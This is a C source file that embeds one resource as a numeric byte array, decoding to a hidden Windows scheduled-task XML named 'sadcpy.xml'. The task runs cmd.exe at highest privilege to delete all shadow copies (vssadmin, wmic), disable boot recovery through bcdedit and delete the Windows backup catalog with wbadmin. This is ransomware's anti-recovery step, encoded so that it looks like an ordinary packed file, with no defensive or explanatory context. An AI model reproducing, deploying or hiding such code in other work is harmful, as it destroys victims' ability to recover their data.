#include "packed_fs.h"

static const unsigned char v1[] = {
  60,  63, 120, 109, 108,  32, 118, 101, 114, 115, 105, 111, // <?xml versio
 110,  61,  34,  49,  46,  48,  34,  32, 101, 110,  99, 111, // n="1.0" enco
 100, 105, 110, 103,  61,  34,  85,  84,  70,  45,  49,  54, // ding="UTF-16
  34,  63,  62,  13,  10,  60,  84,  97, 115, 107,  32, 118, // "?>..<Task v
 101, 114, 115, 105, 111, 110,  61,  34,  49,  46,  50,  34, // ersion="1.2"
  32, 120, 109, 108, 110, 115,  61,  34, 104, 116, 116, 112, //  xmlns="http
  58,  47,  47, 115,  99, 104, 101, 109,  97, 115,  46, 109, // ://schemas.m
 105,  99, 114, 111, 115, 111, 102, 116,  46,  99, 111, 109, // icrosoft.com
  47, 119, 105, 110, 100, 111, 119, 115,  47,  50,  48,  48, // /windows/200
  52,  47,  48,  50,  47, 109, 105, 116,  47, 116,  97, 115, // 4/02/mit/tas
 107,  34,  62,  13,  10,  32,  32,  60,  84, 114, 105, 103, // k">..  <Trig
 103, 101, 114, 115,  32,  47,  62,  13,  10,  32,  32,  60, // gers />..  <
  80, 114, 105, 110,  99, 105, 112,  97, 108, 115,  62,  13, // Principals>.
  10,  32,  32,  32,  32,  60,  80, 114, 105, 110,  99, 105, // .    <Princi
 112,  97, 108,  32, 105, 100,  61,  34,  65, 117, 116, 104, // pal id="Auth
 111, 114,  34,  62,  13,  10,  32,  32,  32,  32,  32,  32, // or">..      
  60,  85, 115, 101, 114,  73, 100,  62,  83,  45,  49,  45, // <UserId>S-1-
  53,  45,  50,  49,  45,  51,  52,  54,  55,  52,  56,  57, // 5-21-3467489
  54,  52,  56,  45,  49,  57,  56,  57,  51,  52,  51,  55, // 648-19893437
  56,  48,  45,  49,  56,  51,  51,  52,  53,  49,  51,  55, // 80-183345137
  51,  45,  49,  48,  48,  49,  60,  47,  85, 115, 101, 114, // 3-1001</User
  73, 100,  62,  13,  10,  32,  32,  32,  32,  32,  32,  60, // Id>..      <
  76, 111, 103, 111, 110,  84, 121, 112, 101,  62,  83,  52, // LogonType>S4
  85,  60,  47,  76, 111, 103, 111, 110,  84, 121, 112, 101, // U</LogonType
  62,  13,  10,  32,  32,  32,  32,  32,  32,  60,  82, 117, // >..      <Ru
 110,  76, 101, 118, 101, 108,  62,  72, 105, 103, 104, 101, // nLevel>Highe
 115, 116,  65, 118,  97, 105, 108,  97,  98, 108, 101,  60, // stAvailable<
  47,  82, 117, 110,  76, 101, 118, 101, 108,  62,  13,  10, // /RunLevel>..
  32,  32,  32,  32,  60,  47,  80, 114, 105, 110,  99, 105, //     </Princi
 112,  97, 108,  62,  13,  10,  32,  32,  60,  47,  80, 114, // pal>..  </Pr
 105, 110,  99, 105, 112,  97, 108, 115,  62,  13,  10,  32, // incipals>.. 
  32,  60,  83, 101, 116, 116, 105, 110, 103, 115,  62,  13, //  <Settings>.
  10,  32,  32,  32,  32,  60,  77, 117, 108, 116, 105, 112, // .    <Multip
 108, 101,  73, 110, 115, 116,  97, 110,  99, 101, 115,  80, // leInstancesP
 111, 108, 105,  99, 121,  62,  73, 103, 110, 111, 114, 101, // olicy>Ignore
  78, 101, 119,  60,  47,  77, 117, 108, 116, 105, 112, 108, // New</Multipl
 101,  73, 110, 115, 116,  97, 110,  99, 101, 115,  80, 111, // eInstancesPo
 108, 105,  99, 121,  62,  13,  10,  32,  32,  32,  32,  60, // licy>..    <
  68, 105, 115,  97, 108, 108, 111, 119,  83, 116,  97, 114, // DisallowStar
 116,  73, 102,  79, 110,  66,  97, 116, 116, 101, 114, 105, // tIfOnBatteri
 101, 115,  62, 102,  97, 108, 115, 101,  60,  47,  68, 105, // es>false</Di
 115,  97, 108, 108, 111, 119,  83, 116,  97, 114, 116,  73, // sallowStartI
 102,  79, 110,  66,  97, 116, 116, 101, 114, 105, 101, 115, // fOnBatteries
  62,  13,  10,  32,  32,  32,  32,  60,  83, 116, 111, 112, // >..    <Stop
  73, 102,  71, 111, 105, 110, 103,  79, 110,  66,  97, 116, // IfGoingOnBat
 116, 101, 114, 105, 101, 115,  62, 116, 114, 117, 101,  60, // teries>true<
  47,  83, 116, 111, 112,  73, 102,  71, 111, 105, 110, 103, // /StopIfGoing
  79, 110,  66,  97, 116, 116, 101, 114, 105, 101, 115,  62, // OnBatteries>
  13,  10,  32,  32,  32,  32,  60,  65, 108, 108, 111, 119, // ..    <Allow
  72,  97, 114, 100,  84, 101, 114, 109, 105, 110,  97, 116, // HardTerminat
 101,  62, 116, 114, 117, 101,  60,  47,  65, 108, 108, 111, // e>true</Allo
 119,  72,  97, 114, 100,  84, 101, 114, 109, 105, 110,  97, // wHardTermina
 116, 101,  62,  13,  10,  32,  32,  32,  32,  60,  83, 116, // te>..    <St
  97, 114, 116,  87, 104, 101, 110,  65, 118,  97, 105, 108, // artWhenAvail
  97,  98, 108, 101,  62, 102,  97, 108, 115, 101,  60,  47, // able>false</
  83, 116,  97, 114, 116,  87, 104, 101, 110,  65, 118,  97, // StartWhenAva
 105, 108,  97,  98, 108, 101,  62,  13,  10,  32,  32,  32, // ilable>..   
  32,  60,  82, 117, 110,  79, 110, 108, 121,  73, 102,  78, //  <RunOnlyIfN
 101, 116, 119, 111, 114, 107,  65, 118,  97, 105, 108,  97, // etworkAvaila
  98, 108, 101,  62, 102,  97, 108, 115, 101,  60,  47,  82, // ble>false</R
 117, 110,  79, 110, 108, 121,  73, 102,  78, 101, 116, 119, // unOnlyIfNetw
 111, 114, 107,  65, 118,  97, 105, 108,  97,  98, 108, 101, // orkAvailable
  62,  13,  10,  32,  32,  32,  32,  60,  73, 100, 108, 101, // >..    <Idle
  83, 101, 116, 116, 105, 110, 103, 115,  62,  13,  10,  32, // Settings>.. 
  32,  32,  32,  32,  32,  60,  83, 116, 111, 112,  79, 110, //      <StopOn
  73, 100, 108, 101,  69, 110, 100,  62, 116, 114, 117, 101, // IdleEnd>true
  60,  47,  83, 116, 111, 112,  79, 110,  73, 100, 108, 101, // </StopOnIdle
  69, 110, 100,  62,  13,  10,  32,  32,  32,  32,  32,  32, // End>..      
  60,  82, 101, 115, 116,  97, 114, 116,  79, 110,  73, 100, // <RestartOnId
 108, 101,  62, 102,  97, 108, 115, 101,  60,  47,  82, 101, // le>false</Re
 115, 116,  97, 114, 116,  79, 110,  73, 100, 108, 101,  62, // startOnIdle>
  13,  10,  32,  32,  32,  32,  60,  47,  73, 100, 108, 101, // ..    </Idle
  83, 101, 116, 116, 105, 110, 103, 115,  62,  13,  10,  32, // Settings>.. 
  32,  32,  32,  60,  65, 108, 108, 111, 119,  83, 116,  97, //    <AllowSta
 114, 116,  79, 110,  68, 101, 109,  97, 110, 100,  62, 116, // rtOnDemand>t
 114, 117, 101,  60,  47,  65, 108, 108, 111, 119,  83, 116, // rue</AllowSt
  97, 114, 116,  79, 110,  68, 101, 109,  97, 110, 100,  62, // artOnDemand>
  13,  10,  32,  32,  32,  32,  60,  69, 110,  97,  98, 108, // ..    <Enabl
 101, 100,  62, 116, 114, 117, 101,  60,  47,  69, 110,  97, // ed>true</Ena
  98, 108, 101, 100,  62,  13,  10,  32,  32,  32,  32,  60, // bled>..    <
  72, 105, 100, 100, 101, 110,  62, 116, 114, 117, 101,  60, // Hidden>true<
  47,  72, 105, 100, 100, 101, 110,  62,  13,  10,  32,  32, // /Hidden>..  
  32,  32,  60,  82, 117, 110,  79, 110, 108, 121,  73, 102, //   <RunOnlyIf
  73, 100, 108, 101,  62, 102,  97, 108, 115, 101,  60,  47, // Idle>false</
  82, 117, 110,  79, 110, 108, 121,  73, 102,  73, 100, 108, // RunOnlyIfIdl
 101,  62,  13,  10,  32,  32,  32,  32,  60,  87,  97, 107, // e>..    <Wak
 101,  84, 111,  82, 117, 110,  62, 102,  97, 108, 115, 101, // eToRun>false
  60,  47,  87,  97, 107, 101,  84, 111,  82, 117, 110,  62, // </WakeToRun>
  13,  10,  32,  32,  32,  32,  60,  69, 120, 101,  99, 117, // ..    <Execu
 116, 105, 111, 110,  84, 105, 109, 101,  76, 105, 109, 105, // tionTimeLimi
 116,  62,  80,  84,  55,  50,  72,  60,  47,  69, 120, 101, // t>PT72H</Exe
  99, 117, 116, 105, 111, 110,  84, 105, 109, 101,  76, 105, // cutionTimeLi
 109, 105, 116,  62,  13,  10,  32,  32,  32,  32,  60,  80, // mit>..    <P
 114, 105, 111, 114, 105, 116, 121,  62,  55,  60,  47,  80, // riority>7</P
 114, 105, 111, 114, 105, 116, 121,  62,  13,  10,  32,  32, // riority>..  
  60,  47,  83, 101, 116, 116, 105, 110, 103, 115,  62,  13, // </Settings>.
  10,  32,  32,  60,  65,  99, 116, 105, 111, 110, 115,  32, // .  <Actions 
  67, 111, 110, 116, 101, 120, 116,  61,  34,  65, 117, 116, // Context="Aut
 104, 111, 114,  34,  62,  13,  10,  32,  32,  32,  32,  60, // hor">..    <
  69, 120, 101,  99,  62,  13,  10,  32,  32,  32,  32,  32, // Exec>..     
  32,  60,  67, 111, 109, 109,  97, 110, 100,  62,  67,  58, //  <Command>C:
  92,  87, 105, 110, 100, 111, 119, 115,  92,  83, 121, 115, // .Windows.Sys
 116, 101, 109,  51,  50,  92,  99, 109, 100,  46, 101, 120, // tem32.cmd.ex
 101,  60,  47,  67, 111, 109, 109,  97, 110, 100,  62,  13, // e</Command>.
  10,  32,  32,  32,  32,  32,  32,  60,  65, 114, 103, 117, // .      <Argu
 109, 101, 110, 116, 115,  62,  47,  99,  32, 114, 117, 110, // ments>/c run
  97, 115,  32,  47,  99,  32, 118, 115, 115,  97, 100, 109, // as /c vssadm
 105, 110,  32, 100, 101, 108, 101, 116, 101, 115, 104,  97, // in deletesha
 100, 111, 119, 115,  32,  47,  97, 108, 108,  32,  47, 113, // dows /all /q
 117, 105, 101, 116,  32,  38,  97, 109, 112,  59,  32, 119, // uiet &amp; w
 109, 105,  99,  32, 115, 104,  97, 100, 111, 119,  99, 111, // mic shadowco
 112, 121,  32, 100, 101, 108, 101, 116, 101,  38,  97, 109, // py delete&am
 112,  59,  32,  98,  99, 100, 101, 100, 105, 116,  32,  47, // p; bcdedit /
 115, 101, 116,  32, 123, 100, 101, 102,  97, 117, 108, 116, // set {default
 125,  32,  98, 111, 111, 116, 115, 116,  97, 116, 117, 115, // } bootstatus
 112, 111, 108, 105,  99, 121,  32, 105, 103, 110, 111, 114, // policy ignor
 101,  97, 108, 108, 102,  97, 105, 108, 117, 114, 101, 115, // eallfailures
  32,  38,  97, 109, 112,  59,  32,  98,  99, 100, 101, 100, //  &amp; bcded
 105, 116,  32,  47, 115, 101, 116,  32, 123, 100, 101, 102, // it /set {def
  97, 117, 108, 116, 125,  32, 114, 101,  99, 111, 118, 101, // ault} recove
 114, 121, 101, 110,  97,  98, 108, 101, 100,  32, 110, 111, // ryenabled no
  32,  38,  97, 109, 112,  59,  32, 119,  98,  97, 100, 109, //  &amp; wbadm
 105, 110,  32, 100, 101, 108, 101, 116, 101,  99,  97, 116, // in deletecat
  97, 108, 111, 103,  32,  45, 113, 117, 105, 101, 116,  60, // alog -quiet<
  47,  65, 114, 103, 117, 109, 101, 110, 116, 115,  62,  13, // /Arguments>.
  10,  32,  32,  32,  32,  60,  47,  69, 120, 101,  99,  62, // .    </Exec>
  13,  10,  32,  32,  60,  47,  65,  99, 116, 105, 111, 110, // ..  </Action
 115,  62,  13,  10,  60,  47,  84,  97, 115, 107,  62, 0 // s>..</Task>
};

static const struct packed_file {
  const char *name;
  const unsigned char *data;
  size_t size;
  time_t mtime;
} packed_files[] = {
  {"/./Sources/embed/sadcpy.xml", v1, sizeof(v1), 1633782954},
  {NULL, NULL, 0, 0}
};

const char *mg_unlist(size_t no) {
  return packed_files[no].name;
}
const char *mg_unpack(const char *name, size_t *size, time_t *mtime) {
  const struct packed_file *p;
  for (p = packed_files; p->name != NULL; p++) {
    if (strcmp(p->name, name) != 0) continue;
    if (size != NULL) *size = p->size - 1;
    if (mtime != NULL) *mtime = p->mtime;
    return (const char *) p->data;
  }
  return NULL;
}